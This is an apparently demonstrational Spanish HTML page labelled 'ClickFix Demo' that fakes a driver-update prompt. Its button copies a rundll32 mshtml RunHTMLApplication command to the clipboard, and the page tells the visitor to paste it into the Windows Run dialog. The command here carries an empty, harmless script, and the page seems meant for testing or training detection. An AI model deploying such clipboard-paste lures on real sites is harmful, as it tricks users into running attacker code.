<!doctype html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>ClickFix Demo - Win espaciado</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        margin: 24px;
        background: #f1f5f9;
        color: #1f2937;
      }
      .panel {
        max-width: 740px;
        background: #ffffff;
        border-radius: 14px;
        padding: 20px;
        border: 1px solid #e2e8f0;
      }
      .highlight {
        font-weight: 700;
        color: #b91c1c;
      }
      code {
        background: #111827;
        color: #f9fafb;
        padding: 4px 8px;
        border-radius: 6px;
      }
    </style>
  </head>
  <body>
    <div class="panel">
      <h1>Actualiza el controlador (falso)</h1>
      <p>
        Haz clic en el botón y después presiona <span class="highlight">W&nbsp;I&nbsp;N</span> +
        <span class="highlight">R</span> para abrir Ejecutar. Luego pega el texto.
      </p>
      <p>
        <code>rundll32.exe javascript:"\"\\..\\mshtml,RunHTMLApplication\"";document.write();</code>
      </p>
      <button id="copy-spaced" type="button">Copiar instrucciones</button>
    </div>
    <script>
      const payload =
        'rundll32.exe javascript:"\\"\\\\..\\\\mshtml,RunHTMLApplication\\"";document.write();';
      document.getElementById("copy-spaced").addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(payload);
        } catch (error) {
          const fallback = document.createElement("textarea");
          fallback.value = payload;
          document.body.appendChild(fallback);
          fallback.select();
          document.execCommand("copy");
          fallback.remove();
        }
      });
    </script>
  </body>
</html>
